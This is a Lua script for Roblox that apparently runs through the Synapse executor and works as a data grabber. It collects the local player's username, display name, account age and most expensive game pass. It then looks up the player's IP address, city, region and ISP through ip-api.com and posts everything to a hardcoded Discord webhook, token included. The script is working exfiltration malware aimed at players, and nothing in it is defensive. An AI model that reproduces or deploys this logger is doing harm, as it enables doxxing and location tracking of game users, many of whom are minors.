local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketPlaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
local webhook_url = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

if not player then return end

local userId = player.UserId
local username = player.Name
local displayName = player.DisplayName
local accountAge = player.AccountAge
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

local ip_info = syn.request({Url = "http://ip-api.com/json", Method = "GET"})
local ipinfo_table = HttpService:JSONDecode(ip_info.Body)

local highestPrice = 0
local mostExpensiveItem = "None"

local success, gamePasses = pcall(function()
    return MarketPlaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Asset).GamePassProductIds or {}
end)

if success and #gamePasses > 0 then
    for _, passId in ipairs(gamePasses) do
        if player:IsGamePassOwned(passId) then
            local info = MarketPlaceService:GetProductInfo(passId, Enum.InfoType.GamePass)
            if info.PriceInRobux and info.PriceInRobux > highestPrice then
                highestPrice = info.PriceInRobux
                mostExpensiveItem = info.Name
            end
        end
    end
end

local expensiveText = highestPrice > 0 and string.format("%s (%d Robux)", mostExpensiveItem, highestPrice) or "None owned"

local embed = {
    title = "Roblox User Data",
    description = string.format("**Profile:** [%s](<%s>)\n**Username:** `@%s`\n**Display Name:** `%s`\n**Account Age:** %d days\n\n**Most Expensive Owned Item:** %s", 
        username, profileUrl, username, displayName, accountAge, expensiveText),
    color = 65280,
    thumbnail = {url = thumbnailUrl},
    fields = {
        {
            name = "IP & Location",
            value = string.format("```IP: %s\nCountry: %s (%s)\nRegion: %s\nCity: %s\nISP: %s```",
                ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode,
                ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.isp)
        }
    },
    footer = {text = "Data captured at: " .. os.date("%Y-%m-%d %H:%M:%S")}
}

syn.request({
    Url = webhook_url,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode({embeds = {embed}})
})
